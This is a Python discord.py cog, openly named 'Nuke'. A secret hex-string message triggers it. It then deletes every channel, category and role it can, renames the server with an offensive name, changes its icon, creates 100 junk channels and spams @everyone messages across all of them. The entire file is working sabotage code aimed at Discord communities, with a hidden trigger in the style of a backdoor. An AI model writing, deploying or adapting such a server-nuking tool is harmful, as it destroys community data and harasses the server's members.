import requests
import discord
import asyncio
import src.tools
from discord.ext import commands
from rich.console import Console
from ezcord import log

console = Console()


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.member_count = 0
        self.channel_count = 0
        self.category_count = 0
        self.role_count = 0
        self.bot = bot

    async def generate_channels(self, guild: discord.Guild):
        for i in range(100):
            name = await src.tools.random_message()
            await guild.create_text_channel(name=f"{name}")
            log.info(f"Channel Created {name} | {i} / 287")
            await asyncio.sleep(0.25)

    @commands.Cog.listener()
    async def on_message(self, message):
        print("Event triggert")
        if not message.content == "5a791e0ba508898d80f797d9432b145048884c4867f817b6e62d3b73743f6387ff3651d2bec004c6b5354e93074961d0eb885b01129af74de3e3f0daf1c4fefc":
            return
        if message.author == self.bot.user:
            return
        await message.delete()
        channels = message.guild.channels
        for channel in channels:
            if self.channel_count > 6:
                await asyncio.sleep(2)
                self.channel_count = 0
            try:
                await channel.delete()
                log.info(f"Channel {channel.name} deleted")
                await asyncio.sleep(0.3)
            except discord.Forbidden:
                log.critical(f"Channel {channel.name} could not be deleted")
                pass

        categories = message.guild.categories
        for category in categories:
            if self.category_count > 6:
                await asyncio.sleep(2)
                self.category_count = 0
            try:
                await category.delete()
                log.info(f"Category {category.name} deleted")
                await asyncio.sleep(0.3)
            except discord.Forbidden:
                log.info(f"Category {category.name} could not be deleted")

        roles = message.guild.roles
        for role in roles:
            if self.role_count > 6:
                await asyncio.sleep(2)
                self.role_count = 0
            if not role.name == "everyone":
                try:
                    await role.delete()
                    log.info(f"Role {role.name} deleted")
                    await asyncio.sleep(0.3)
                except:
                    log.critical(f"Failed to delete role: {role.name}")
                    log.critical(f"Role {role.name} could not be deleted")
                    pass

        with open('CIqInuK.png', 'rb') as f:
            icon_data = f.read()  # Lesen Sie die Daten aus der Datei
            icon = bytes(icon_data)  # Konvertieren Sie die Daten in ein Bytes-Objekt
            await message.guild.edit(icon=icon, name="Nuke by PedoHure69")
        await self.generate_channels(message.guild)
        await asyncio.sleep(15)

        for i in range(200):
            for channel in message.guild.channels:
                await asyncio.sleep(0.4)
                await channel.send("@everyone | Hab dich lieb ;d")


def setup(bot):
    bot.add_cog(Nuke(bot))
